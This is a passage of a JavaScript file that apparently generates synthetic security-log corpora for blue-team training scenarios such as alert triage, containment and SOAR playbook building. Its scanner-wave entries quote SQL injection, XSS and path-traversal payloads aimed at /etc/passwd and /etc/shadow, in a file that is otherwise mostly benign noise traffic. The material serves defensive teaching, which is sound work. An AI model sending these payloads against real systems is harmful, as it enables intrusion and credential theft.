    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:37:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:631 → 10.0.5.12:445 — print-smb',
    null, false, null);

  _ac.e('02:38:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:38:15', 'dns', 'info',
    'A query rubygems.org from 10.0.6.15',
    null, false, null);

  _ac.e('02:38:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43800 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _ac.e('02:38:45', 'web', 'info',
    '10.0.6.15 POST /api/cron/report — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:39:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:39:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  _ac.e('02:39:30', 'dns', 'info',
    'A query security.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:39:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:40:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    null, false, null);

  _ac.e('02:40:15', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:40:30', 'dns', 'info',
    'A query dl.google.com from 10.0.1.50',
    null, false, null);

  _ac.e('02:40:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43900 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _ac.e('02:41:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:41:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _ac.e('02:41:30', 'web', 'info',
    '10.0.6.15 POST /api/cron/cleanup — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:41:45', 'dns', 'info',
    'A query api.pagerduty.com from 10.0.1.50',
    null, false, null);

  _ac.e('02:42:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:42:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:631 → 10.0.5.12:445 — print-smb',
    null, false, null);

  _ac.e('02:42:30', 'ids', 'info',
    'Signature update completed — 8 new rules loaded',
    null, false, null);

  _ac.e('02:42:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:43:00', 'dns', 'info',
    'A query connectivity-check.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:43:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44000 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _ac.e('02:43:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:43:45', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  _ac.e('02:44:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:44:15', 'dns', 'info',
    'A query docker.io from 10.0.6.15',
    null, false, null);

  _ac.e('02:44:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    null, false, null);

  _ac.e('02:44:45', 'web', 'info',
    '10.0.6.15 POST /api/cron/heartbeat — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:45:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:45:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44100 → 52.217.44.68:443 — s3-backup-sync',
    null, false, null);

  _ac.e('02:45:30', 'dns', 'info',
    'AAAA query updates.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:45:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:46:00', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _ac.e('02:46:15', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:46:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:631 → 10.0.5.11:445 — print-smb',
    null, false, null);

  _ac.e('02:46:45', 'dns', 'info',
    'A query graph.microsoft.com from 10.0.3.10',
    null, false, null);

  _ac.e('02:47:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:47:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44200 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _ac.e('02:47:30', 'web', 'info',
    '10.0.6.15 POST /api/cron/report — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:47:45', 'ids', 'info',
    'Heartbeat: IDS engine running — 8458 rules active',
    null, false, null);

  _ac.e('02:48:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:48:15', 'dns', 'info',
    'A query letsencrypt.org from 10.0.1.50',
    null, false, null);

  _ac.e('02:48:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    null, false, null);

  _ac.e('02:48:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:49:00', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  _ac.e('02:49:15', 'dns', 'info',
    'A query npm.pkg.github.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:49:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:49:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44300 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _ac.e('02:50:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:50:15', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  var CONTAINMENT = _ac.entries;

  /* ════════════════════════════════════════════════════
     Build the Playbook — 2024-05-15 11:00–12:30 UTC
     ════════════════════════════════════════════════════

     Scanner:    23.94.12.88 (automated vuln scanner)
     Target:     10.0.2.20 (portal.acmecorp.lab)
     Googlebot:  66.249.66.1
     Bingbot:    40.77.167.100
     Monitor:    10.0.4.55

     Normal users:
       72.44.128.90   — US east coast employee
       98.22.156.71   — US midwest employee
       203.0.113.42   — EU employee
       91.189.92.10   — internal monitoring
     ════════════════════════════════════════════════════ */

  var _sp = makeCorpus('2024-05-15 ');

  /* ── Normal morning traffic ──────────────────────── */

  _sp.e('11:00:01', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    { srcIp: '10.0.4.55', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/api/health', status: 200, bytes: 48, userAgent: 'internal-monitor/1.0' },
    false, null);

  _sp.e('11:00:15', 'web', 'info',
    '72.44.128.90 GET / — 200 OK — Mozilla/5.0 (Windows NT 10.0)',
    { srcIp: '72.44.128.90', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/', status: 200, bytes: 14200, userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
    false, null);

  _sp.e('11:00:30', 'auth', 'info',
    'Login success user=jthompson from 72.44.128.90',
    { event: 'login_success', user: 'jthompson', srcIp: '72.44.128.90', sessionId: 'sess_jt_p01', mfa: true },
    false, null);

  _sp.e('11:00:45', 'web', 'info',
    '98.22.156.71 GET / — 200 OK — Mozilla/5.0 (Macintosh)',
    null, false, null);

  _sp.e('11:01:00', 'auth', 'info',
    'Login success user=kmorales from 98.22.156.71',
    null, false, null);

  _sp.e('11:01:15', 'web', 'info',
    '66.249.66.1 GET /robots.txt — 200 OK — Googlebot/2.1',
    { srcIp: '66.249.66.1', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/robots.txt', status: 200, bytes: 240, userAgent: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
    false, null);

  _sp.e('11:01:30', 'web', 'info',
    '203.0.113.42 GET / — 200 OK — Mozilla/5.0 (X11; Linux x86_64)',
    null, false, null);

  _sp.e('11:01:45', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    null, false, null);

  _sp.e('11:02:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    { srcIp: '91.189.92.10', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/api/metrics', status: 200, bytes: 8400, userAgent: 'prometheus/2.45' },
    false, null);

  _sp.e('11:02:15', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _sp.e('11:02:30', 'web', 'info',
    '40.77.167.100 GET /sitemap.xml — 200 OK — bingbot/2.0',
    { srcIp: '40.77.167.100', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/sitemap.xml', status: 200, bytes: 3200, userAgent: 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)' },
    false, null);

  /* ── First scanner wave ──────────────────────────── */

  _sp.e('11:03:00', 'waf', 'medium',
    'SQL injection attempt from 23.94.12.88: GET /login?user=admin\'OR+1=1--',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'sqli-detect-generic', action: 'BLOCK', method: 'GET', path: '/login?user=admin\'OR+1=1--', matchedPattern: 'OR 1=1', riskScore: 85 },
    true, 'scanner-pattern');

  _sp.e('11:03:05', 'waf', 'medium',
    'XSS attempt from 23.94.12.88: GET /search?q=<script>alert(1)</script>',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'xss-detect-generic', action: 'BLOCK', method: 'GET', path: '/search?q=<script>alert(1)</script>', matchedPattern: '<script>', riskScore: 80 },
    true, 'scanner-pattern');

  _sp.e('11:03:10', 'waf', 'medium',
    'Path traversal attempt from 23.94.12.88: GET /files/../../../etc/passwd',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'path-traversal', action: 'BLOCK', method: 'GET', path: '/files/../../../etc/passwd', matchedPattern: '../', riskScore: 90 },
    true, 'scanner-pattern');

  _sp.e('11:03:15', 'ids', 'medium',
    'Automated scanner detected from 23.94.12.88 — Nikto/2.1.6 signature',
    { alertId: 'SCAN-001', srcIp: '23.94.12.88', dstIp: '10.0.2.20', action: 'ALERT', signature: 'Nikto Web Scanner', userAgent: 'Mozilla/5.0 (compatible; Nikto/2.1.6)' },
    true, 'scanner-pattern');

  /* ── Normal traffic interleave ───────────────────── */

  _sp.e('11:03:30', 'web', 'info',
    '98.22.156.71 GET /reports/weekly — 200 OK',
    null, false, null);

  _sp.e('11:03:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:04:00', 'web', 'info',
    '72.44.128.90 POST /api/tasks — 201 Created',
    null, false, null);

  _sp.e('11:04:15', 'web', 'info',
    '66.249.66.1 GET /about — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:04:30', 'web', 'info',
    '203.0.113.42 GET /projects/roadmap — 200 OK',
    null, false, null);

  _sp.e('11:04:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:05:00', 'web', 'info',
    '98.22.156.71 GET /dashboard — 200 OK',
    null, false, null);

  _sp.e('11:05:15', 'web', 'info',
    '40.77.167.100 GET /blog — 200 OK — bingbot/2.0',
    null, false, null);

  /* ── Second scanner wave (same pattern) ──────────── */

  _sp.e('11:08:00', 'waf', 'medium',
    'SQL injection attempt from 23.94.12.88: GET /api/users?id=1+UNION+SELECT+*+FROM+users',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'sqli-detect-generic', action: 'BLOCK', method: 'GET', path: '/api/users?id=1+UNION+SELECT+*+FROM+users', matchedPattern: 'UNION SELECT', riskScore: 90 },
    true, 'recurring-alert');

  _sp.e('11:08:05', 'waf', 'medium',
    'XSS attempt from 23.94.12.88: GET /comment?body=<img+src=x+onerror=alert(1)>',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'xss-detect-generic', action: 'BLOCK', method: 'GET', path: '/comment?body=<img+src=x+onerror=alert(1)>', matchedPattern: 'onerror=', riskScore: 80 },
    true, 'recurring-alert');

  _sp.e('11:08:10', 'waf', 'medium',
    'Path traversal attempt from 23.94.12.88: GET /download?file=....//....//etc/shadow',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'path-traversal', action: 'BLOCK', method: 'GET', path: '/download?file=....//....//etc/shadow', matchedPattern: '..../', riskScore: 90 },
    true, 'recurring-alert');

  _sp.e('11:08:15', 'ids', 'medium',
    'Automated scanner detected from 23.94.12.88 — repeat pattern (wave 2)',
    { alertId: 'SCAN-002', srcIp: '23.94.12.88', dstIp: '10.0.2.20', action: 'ALERT', signature: 'Nikto Web Scanner', waveCount: 2, interval: '~5min' },
    true, 'recurring-alert');

  /* ── Normal traffic ──────────────────────────────── */

  _sp.e('11:08:30', 'web', 'info',
    '72.44.128.90 GET /api/notifications — 200 OK',
    null, false, null);

  _sp.e('11:08:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:09:00', 'web', 'info',
    '203.0.113.42 POST /api/tasks — 201 Created',
    null, false, null);

  _sp.e('11:09:15', 'auth', 'info',
    'OAuth token refresh user=jthompson — success',
    null, false, null);

  _sp.e('11:09:30', 'web', 'info',
    '98.22.156.71 GET /api/calendar — 200 OK',
    null, false, null);

  _sp.e('11:09:45', 'web', 'info',
    '66.249.66.1 GET /blog/latest — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:10:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:10:15', 'web', 'info',
    '72.44.128.90 GET /reports/monthly — 200 OK',
    null, false, null);

  _sp.e('11:10:30', 'web', 'info',
    '40.77.167.100 GET /products — 200 OK — bingbot/2.0',
    null, false, null);

  _sp.e('11:10:45', 'auth', 'info',
    'Logout user=kmorales session=sess_km_p01',
    null, false, null);

  _sp.e('11:11:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:11:15', 'web', 'info',
    '203.0.113.42 GET /dashboard — 200 OK',
    null, false, null);

  _sp.e('11:11:30', 'web', 'info',
    '98.22.156.71 POST /reports/export — 200 OK',
    null, false, null);

  /* ── Third scanner wave (threshold trigger) ──────── */

  _sp.e('11:13:00', 'waf', 'medium',
    'SQL injection attempt from 23.94.12.88: POST /login — body contains UNION SELECT',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'sqli-detect-generic', action: 'BLOCK', method: 'POST', path: '/login', matchedPattern: 'UNION SELECT', riskScore: 90 },
    true, 'threshold-trigger');

  _sp.e('11:13:05', 'waf', 'medium',
    'XSS attempt from 23.94.12.88: POST /feedback — body contains <script>',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'xss-detect-generic', action: 'BLOCK', method: 'POST', path: '/feedback', matchedPattern: '<script>', riskScore: 80 },
    true, 'threshold-trigger');

  _sp.e('11:13:10', 'waf', 'high',
    'Threshold exceeded: 23.94.12.88 — 9 blocked requests in 10 min (threshold: 5)',
    { srcIp: '23.94.12.88', dstIp: '10.0.2.20', rule: 'repeat-offender', action: 'BLOCK', blockedCount: 9, windowMin: 10, threshold: 5 },
    true, 'threshold-trigger');

  _sp.e('11:13:15', 'ids', 'high',
    'Automated scanner 23.94.12.88 — 3 waves, same pattern — playbook candidate',
    { alertId: 'SCAN-003', srcIp: '23.94.12.88', dstIp: '10.0.2.20', action: 'ALERT', signature: 'Nikto Web Scanner', waveCount: 3, interval: '~5min', recommendation: 'auto-block' },
    true, 'playbook-trigger');

  /* ── Normal traffic tail ─────────────────────────── */

  _sp.e('11:13:30', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _sp.e('11:13:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:14:00', 'web', 'info',
    '203.0.113.42 GET /api/calendar — 200 OK',
    null, false, null);

  _sp.e('11:14:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:14:30', 'web', 'info',
    '98.22.156.71 GET /api/notifications — 200 OK',
    null, false, null);

  _sp.e('11:14:45', 'web', 'info',
    '66.249.66.1 GET /contact — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:15:00', 'web', 'info',
    '40.77.167.100 GET /about — 200 OK — bingbot/2.0',
    null, false, null);

  /* ── Automated response entries (what playbook should do) */

  _sp.e('11:15:15', 'waf', 'info',
    'Manual block applied: 23.94.12.88 — operator action',
    { srcIp: '23.94.12.88', rule: 'manual-block', action: 'BLOCK', operator: 'soc-analyst', note: 'recurring scanner — should be automated' },
    true, 'automated-response');

  _sp.e('11:15:30', 'web', 'info',
    '72.44.128.90 GET /api/tasks — 200 OK',
    null, false, null);

  _sp.e('11:15:45', 'auth', 'info',
    'Logout user=jthompson session=sess_jt_p01',
    null, false, null);

  _sp.e('11:16:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:16:15', 'web', 'info',
    '203.0.113.42 GET /reports/quarterly — 200 OK',
    null, false, null);

  _sp.e('11:16:30', 'auth', 'info',
    'Logout user=mweber session=sess_mw_p01',
    null, false, null);

  _sp.e('11:16:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:17:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:17:15', 'web', 'info',
    '72.44.128.90 GET /api/notifications — 200 OK',
    null, false, null);

  _sp.e('11:17:30', 'web', 'info',
    '203.0.113.42 GET /projects/backlog — 200 OK',
    null, false, null);

  _sp.e('11:17:45', 'web', 'info',
    '66.249.66.1 GET /products — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:18:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:18:15', 'auth', 'info',
    'Login success user=kmorales from 98.22.156.71',
    null, false, null);

  _sp.e('11:18:30', 'web', 'info',
    '98.22.156.71 GET /dashboard — 200 OK',
    null, false, null);

  _sp.e('11:18:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:19:00', 'web', 'info',
    '40.77.167.100 GET /blog/latest — 200 OK — bingbot/2.0',
    null, false, null);

  _sp.e('11:19:15', 'web', 'info',
    '72.44.128.90 POST /api/tasks — 201 Created',
    null, false, null);

  _sp.e('11:19:30', 'auth', 'info',
    'OAuth token refresh user=mweber — success',
    null, false, null);

  _sp.e('11:19:45', 'web', 'info',
    '203.0.113.42 GET /api/calendar — 200 OK',
    null, false, null);

  _sp.e('11:20:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:20:15', 'web', 'info',
    '98.22.156.71 GET /reports/weekly — 200 OK',
    null, false, null);

  _sp.e('11:20:30', 'web', 'info',
    '66.249.66.1 GET /sitemap.xml — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:20:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:21:00', 'web', 'info',
    '72.44.128.90 GET /projects/roadmap — 200 OK',
    null, false, null);

  _sp.e('11:21:15', 'web', 'info',
    '203.0.113.42 POST /api/tasks — 201 Created',
    null, false, null);

  _sp.e('11:21:30', 'web', 'info',
    '40.77.167.100 GET /contact — 200 OK — bingbot/2.0',
    null, false, null);

  _sp.e('11:21:45', 'auth', 'info',
    'Logout user=kmorales session=sess_km_p02',
    null, false, null);

  _sp.e('11:22:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:22:15', 'web', 'info',
    '98.22.156.71 GET /api/tasks — 200 OK',
    null, false, null);

  _sp.e('11:22:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:22:45', 'web', 'info',
    '72.44.128.90 GET /dashboard/settings — 200 OK',
    null, false, null);

  _sp.e('11:23:00', 'web', 'info',
    '66.249.66.1 GET /blog — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:23:15', 'web', 'info',
    '203.0.113.42 GET /reports/annual — 200 OK',
    null, false, null);

  _sp.e('11:23:30', 'auth', 'info',
    'Login success user=bkim from 98.22.156.71',
    null, false, null);

  _sp.e('11:23:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:24:00', 'web', 'info',
    '40.77.167.100 GET /products — 200 OK — bingbot/2.0',
    null, false, null);

  _sp.e('11:24:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:24:30', 'web', 'info',
    '98.22.156.71 GET /dashboard — 200 OK',
    null, false, null);

  _sp.e('11:24:45', 'web', 'info',
    '72.44.128.90 GET /api/calendar — 200 OK',
    null, false, null);

  _sp.e('11:25:00', 'web', 'info',
    '203.0.113.42 POST /reports/generate — 200 OK',
    null, false, null);

  _sp.e('11:25:15', 'web', 'info',
    '66.249.66.1 GET /about — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:25:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:25:45', 'auth', 'info',
    'Logout user=bkim session=sess_bk_p01',
    null, false, null);

  _sp.e('11:26:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:26:15', 'web', 'info',
    '98.22.156.71 POST /api/tasks — 201 Created',
    null, false, null);

  _sp.e('11:26:30', 'web', 'info',
    '40.77.167.100 GET /about — 200 OK — bingbot/2.0',
    null, false, null);

  _sp.e('11:26:45', 'web', 'info',
    '72.44.128.90 POST /reports/export — 200 OK',
    null, false, null);

  _sp.e('11:27:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:27:15', 'web', 'info',
    '203.0.113.42 GET /api/notifications — 200 OK',
    null, false, null);

  _sp.e('11:27:30', 'auth', 'info',
    'OAuth token refresh user=jthompson — success',
    null, false, null);

  _sp.e('11:27:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:28:00', 'web', 'info',
    '98.22.156.71 GET /reports/monthly — 200 OK',
    null, false, null);

  _sp.e('11:28:15', 'web', 'info',
    '66.249.66.1 GET /products/featured — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:28:30', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _sp.e('11:28:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:29:00', 'web', 'info',
    '203.0.113.42 GET /dashboard/settings — 200 OK',
    null, false, null);

  _sp.e('11:29:15', 'auth', 'info',
    'Login success user=jthompson from 72.44.128.90',
    null, false, null);

  _sp.e('11:29:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:29:45', 'web', 'info',
    '40.77.167.100 GET /sitemap.xml — 200 OK — bingbot/2.0',
    null, false, null);

  _sp.e('11:30:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:30:15', 'web', 'info',
    '98.22.156.71 GET /api/calendar — 200 OK',
    null, false, null);

  _sp.e('11:30:30', 'web', 'info',
    '203.0.113.42 POST /api/tasks — 201 Created',
    null, false, null);

  _sp.e('11:30:45', 'auth', 'info',
    'Logout user=mweber session=sess_mw_p02',
    null, false, null);

  _sp.e('11:31:00', 'web', 'info',
    '72.44.128.90 GET /reports/daily — 200 OK',
    null, false, null);

  _sp.e('11:31:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _sp.e('11:31:30', 'web', 'info',
    '66.249.66.1 GET /contact — 200 OK — Googlebot/2.1',
    null, false, null);

  _sp.e('11:31:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _sp.e('11:32:00', 'web', 'info',
    '98.22.156.71 GET /dashboard/settings — 200 OK',
    null, false, null);

  _sp.e('11:32:15', 'web', 'info',
    '203.0.113.42 GET /api/tasks — 200 OK',
    null, false, null);

  var SOAR_PLAYBOOK = _sp.entries;

  /* ════════════════════════════════════════════════════
     Scenario registry
     ════════════════════════════════════════════════════ */

  var scenarios = {
    'blue-investigate-shopstack': SHOPSTACK,
    'blue-alert-triage': ALERT_TRIAGE,
    'blue-phishing-analysis': PHISHING,
    'blue-log-analysis': LOG_ANALYSIS,
    'blue-containment': CONTAINMENT,
    'blue-soar-playbook': SOAR_PLAYBOOK
  };

  /* ════════════════════════════════════════════════════
     Procedural Templates
     ════════════════════════════════════════════════════
     Default randomization templates for each blue team
     scenario. Used by Procedural.apply() to swap IPs,
     domains, usernames, sessions, and inject noise so
     evidence corpora differ on every run.
     ════════════════════════════════════════════════════ */

  var templates = {

    'blue-investigate-shopstack': {
      ips: {
        '198.51.100.47': { pool: 'vps-ranges', role: 'attacker' },
        '203.0.113.99':  { pool: 'vps-ranges', role: 'exfil' }
      },
      timestamps: { jitter_minutes: [-30, 30] },
      domains: {
        'evil-collector.example.com': { generator: 'dga' }
      },
      sessions: { pattern: 'sess_{random_hex_4}' },
      noise: {
        inject: true,
        count: [15, 30],
        sources: ['web', 'fw', 'dns']
      }
    },

    'blue-alert-triage': {
      ips: {
        '45.33.32.100': { pool: 'vps-ranges', role: 'attacker' }
      },
      timestamps: { jitter_minutes: [-20, 20] },
      sessions: { pattern: 'sess_{random_hex_4}' },
      noise: {
        inject: true,
        count: [15, 25],
        sources: ['web', 'fw', 'auth']
      }
    },

    'blue-phishing-analysis': {
      ips: {
        '93.184.216.34':  { pool: 'vps-ranges', role: 'phishing-infra' },
        '91.240.118.55':  { pool: 'vps-ranges', role: 'attacker-reuse' }
      },
      timestamps: { jitter_minutes: [-30, 30] },
      domains: {
        'acmecorp-login.xyz': { generator: 'dga' }
      },
      sessions: { pattern: 'sess_{random_hex_4}' },
      noise: {
        inject: true,
        count: [15, 30],
        sources: ['web', 'fw', 'dns', 'auth']
      }
    },

    'blue-log-analysis': {
      ips: {
        '198.51.100.77': { pool: 'vps-ranges', role: 'c2' }
      },
      timestamps: { jitter_minutes: [-30, 30] },
      domains: {
        'x9z-analytics.xyz': { generator: 'dga' }
      },
      sessions: { pattern: 'sess_{random_hex_4}' },
      noise: {
        inject: true,
        count: [20, 35],
        sources: ['web', 'fw', 'dns']
      }
    },

    'blue-containment': {
      ips: {
        '185.141.63.22':  { pool: 'vps-ranges', role: 'attacker' },
        '91.240.118.200': { pool: 'vps-ranges', role: 'c2' }
      },
      timestamps: { jitter_minutes: [-20, 20] },
      domains: {
        'cdn-update.systemcheck.xyz': { generator: 'dga' }
      },
      sessions: { pattern: 'sess_{random_hex_4}' },
      noise: {
        inject: true,
        count: [15, 30],
        sources: ['web', 'fw', 'dns', 'auth']
      }
    },

    'blue-soar-playbook': {
      ips: {
        '23.94.12.88': { pool: 'vps-ranges', role: 'scanner' }
      },
      timestamps: { jitter_minutes: [-15, 15] },
      sessions: { pattern: 'sess_{random_hex_4}' },
      noise: {
        inject: true,
        count: [15, 25],
        sources: ['web', 'fw', 'dns']
      }
    }
  };

  /* ════════════════════════════════════════════════════
     Public API
     ════════════════════════════════════════════════════ */

  var EvidenceCorpus = {
    /**
     * Return log entries for a given scenario.
     * @param {string} scenarioId
     * @returns {Array} array of log entry objects (chronological)
     */
    get: function (scenarioId) {
      return scenarios[scenarioId] || [];
    },

    /**
     * Return the default procedural template for a scenario.
     * @param {string} scenarioId
     * @returns {Object|null} procedural template or null
     */
    getTemplate: function (scenarioId) {
      return templates[scenarioId] || null;
    }
  };

  /* ── Register on global namespace ───────────────── */
  window.PenumbraLabs = window.PenumbraLabs || {};
  window.PenumbraLabs.EvidenceCorpus = EvidenceCorpus;

})();
